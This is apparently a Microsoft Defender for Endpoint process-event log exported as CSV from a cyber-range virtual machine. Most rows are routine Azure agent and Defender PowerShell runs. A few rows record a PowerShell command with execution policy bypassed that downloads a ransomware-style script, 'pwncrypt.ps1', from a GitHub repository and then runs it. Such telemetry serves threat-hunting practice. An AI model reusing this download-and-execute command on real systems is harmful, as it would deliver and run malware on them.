Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,ProcessVersionInfoCompanyName,ProcessVersionInfoProductName,ProcessVersionInfoProductVersion,ProcessVersionInfoInternalFileName,ProcessVersionInfoOriginalFileName,ProcessVersionInfoFileDescription,ProcessId,ProcessCommandLine,ProcessIntegrityLevel,ProcessTokenElevation,ProcessCreationTime,AccountDomain,AccountName,AccountSid,AccountUpn,AccountObjectId,LogonId,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessAccountUpn,InitiatingProcessAccountObjectId,InitiatingProcessLogonId,InitiatingProcessIntegrityLevel,InitiatingProcessTokenElevation,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessFolderPath,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessSignerType,InitiatingProcessSignatureStatus,ReportId,AppGuardContainerId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionDeviceName,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,ProcessUniqueId,InitiatingProcessUniqueId
"Jun 16, 2025 5:02:31 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,1216,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 16, 2025 5:02:31 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7412,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 16, 2025 5:02:31 PM",c:\windows\system32\cmd.exe,2428,WindowsAzureGuestAgent.exe,"Jun 16, 2025 1:19:20 PM",OsVendor,Valid,10713,,,0,0,,,0,0,,,2533274790397547,2533274790397543
"Jun 16, 2025 5:07:22 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4376,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\93514365-7ff3-4f5e-9dfd-7eb9f6b779a7.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\93514365-7ff3-4f5e-9dfd-7eb9f6b779a7.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '865d37260194678db1cab00632a2bad9b557bbfa1951e549a5fea47a74ff2170')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\93514365-7ff3-4f5e-9dfd-7eb9f6b779a7.ps1' }""",System,TokenElevationTypeDefault,"Jun 16, 2025 5:07:22 PM",nt authority,local service,S-1-5-19,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,3032,"""SenseIR.exe"" ""OfflineSenseIR"" ""1180"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mzk3Mn0=""","Jun 16, 2025 5:07:12 PM",c:\program files\windows defender advanced threat protection\senseir.exe,2360,MsSense.exe,"Jun 16, 2025 1:19:20 PM",OsVendor,Valid,10780,,,0,0,,,0,0,,,2533274790397614,2533274790397611
"Jun 16, 2025 5:09:12 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8600,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '7f77a0c3c469abc006cb762cbe047417374e5729e73608ddf4d729fead6644d3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' }""",System,TokenElevationTypeDefault,"Jun 16, 2025 5:09:12 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,3032,"""SenseIR.exe"" ""OfflineSenseIR"" ""1180"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6Mzk3Mn0=""","Jun 16, 2025 5:07:12 PM",c:\program files\windows defender advanced threat protection\senseir.exe,2360,MsSense.exe,"Jun 16, 2025 1:19:20 PM",OsVendor,Valid,10813,,,0,0,,,0,0,,,2533274790397643,2533274790397611
"Jun 16, 2025 6:03:11 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3620,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 16, 2025 6:03:11 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3372,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 16, 2025 6:03:11 PM",c:\windows\system32\cmd.exe,2492,WindowsAzureGuestAgent.exe,"Jun 16, 2025 6:02:04 PM",OsVendor,Valid,176,,,0,0,,,0,0,,,2814749767106687,2814749767106683
"Jun 16, 2025 6:03:16 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3964,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '671d163865ed6e6f4e6d40478bb315ec3cc97bda75d315a31e012fb17beffb50')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",System,TokenElevationTypeDefault,"Jun 16, 2025 6:03:16 PM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,3216,"""SenseIR.exe"" ""OfflineSenseIR"" ""3472"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzQ2OH0=""","Jun 16, 2025 6:03:05 PM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,237,,,0,0,,,0,0,,,2814749767106691,2814749767106680
"Jun 16, 2025 6:13:24 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4968,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 16, 2025 6:13:24 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,6504,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 16, 2025 6:13:24 PM",c:\windows\system32\cmd.exe,2492,WindowsAzureGuestAgent.exe,"Jun 16, 2025 6:02:04 PM",OsVendor,Valid,2553,,,0,0,,,0,0,,,2814749767107022,2814749767107018
"Jun 16, 2025 6:13:26 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8476,powershell  -ExecutionPolicy Unrestricted -File script19.ps1,System,TokenElevationTypeDefault,"Jun 16, 2025 6:13:26 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7508,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script19.ps1","Jun 16, 2025 6:13:26 PM",c:\windows\system32\cmd.exe,8848,RunCommandExtension.exe,"Jun 16, 2025 6:13:25 PM",OsVendor,Valid,2559,,,0,0,,,0,0,,,2814749767107028,2814749767107026
"Jun 16, 2025 6:13:29 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,5224,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 16, 2025 6:13:29 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5536,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1","Jun 16, 2025 6:13:29 PM",c:\windows\system32\cmd.exe,8476,powershell.exe,"Jun 16, 2025 6:13:26 PM",OsVendor,Valid,2564,,,0,0,,,0,0,,,2814749767107030,2814749767107029
"Jun 16, 2025 6:13:36 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7672,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 16, 2025 6:13:36 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,7100,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1","Jun 16, 2025 6:13:36 PM",c:\windows\system32\cmd.exe,8476,powershell.exe,"Jun 16, 2025 6:13:26 PM",OsVendor,Valid,2623,,,0,0,,,0,0,,,2814749767107034,2814749767107033
"Jun 16, 2025 6:18:57 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6356,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '420e8a8811873976aabed8aa7ac35735813707b91ab52e2f74f24d45dcb751eb')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' }""",System,TokenElevationTypeDefault,"Jun 16, 2025 6:18:57 PM",nt authority,local service,S-1-5-19,,,997,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,3216,"""SenseIR.exe"" ""OfflineSenseIR"" ""3472"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzQ2OH0=""","Jun 16, 2025 6:03:05 PM",c:\program files\windows defender advanced threat protection\senseir.exe,2264,MsSense.exe,"Jun 16, 2025 6:02:03 PM",OsVendor,Valid,3264,,,0,0,,,0,0,,,2814749767107124,2814749767106680
"Jun 16, 2025 6:25:26 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,9180,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 16, 2025 6:25:26 PM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5780,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 16, 2025 6:25:26 PM",c:\windows\system32\cmd.exe,2492,WindowsAzureGuestAgent.exe,"Jun 16, 2025 6:02:04 PM",OsVendor,Valid,4382,,,0,0,,,0,0,,,2814749767107224,2814749767107220
"Jun 16, 2025 6:25:28 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,8512,powershell  -ExecutionPolicy Unrestricted -File script20.ps1,System,TokenElevationTypeDefault,"Jun 16, 2025 6:25:28 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,2096,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script20.ps1","Jun 16, 2025 6:25:28 PM",c:\windows\system32\cmd.exe,1688,RunCommandExtension.exe,"Jun 16, 2025 6:25:26 PM",OsVendor,Valid,4385,,,0,0,,,0,0,,,2814749767107231,2814749767107229
